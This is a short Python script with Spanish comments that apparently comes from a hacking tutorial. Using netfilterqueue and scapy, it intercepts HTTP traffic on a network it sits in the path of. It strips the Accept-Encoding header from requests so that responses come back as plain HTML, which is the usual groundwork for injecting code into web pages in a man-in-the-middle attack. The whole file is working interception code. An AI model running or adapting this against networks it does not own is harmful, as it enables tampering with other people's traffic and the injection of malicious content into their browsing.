import netfilterqueue
import scapy.all as scapy
import re

'''
Dentro del paquete TCP, el parámetro "load" posee una porción de código que codifica el código html a formato gzip.
Lo que queremos hacer es borrar esa porción de código para que se muestre el html sin codificación.
Para ello, dentro de una variable almacenamos una función que elimine la cadena de texto que deseemos y nos retorne ese nuevo valor.
Una vez hecho esto, dentro de la función setload pasamos como parámetros el packete que queremos modificar y el load que queremos
    reemplazar en el que load es una cadena de texto modificada en donde se eliminó la cadena de texto que codifica el html
'''
def setLoad(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload()) #Obtiene toda la información del paquete

    if scapyPacket.haslayer(scapy.Raw):
        try:
            if scapyPacket[scapy.TCP].dport == 80: #Cliente a hecho consulta al servidor HTTP
                print('Original load:\n')
                print(str(scapyPacket[scapy.Raw].load))
                modifiedLoad= re.sub('Accept-Encoding:.*?\\r\\\\n', "", str(scapyPacket[scapy.Raw].load)) #Cadena obtenida de pythex.com
                print('\nModified load:\n' + modifiedLoad + '\n')
                newPacked = setLoad(scapyPacket, modifiedLoad)
                packet.set_payload(bytes(newPacked))
                print(newPacked.show())

            elif scapyPacket[scapy.TCP].sport == 80: #Servidor HTTP envía respuesta al cliente
                print('Response')
                print(scapyPacket.show())
        
        except IndexError:
            pass
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(1, processPacket)

try:        
    queue.run()

except KeyboardInterrupt:
    print('\nPrograma finalizado')

queue.unbind()
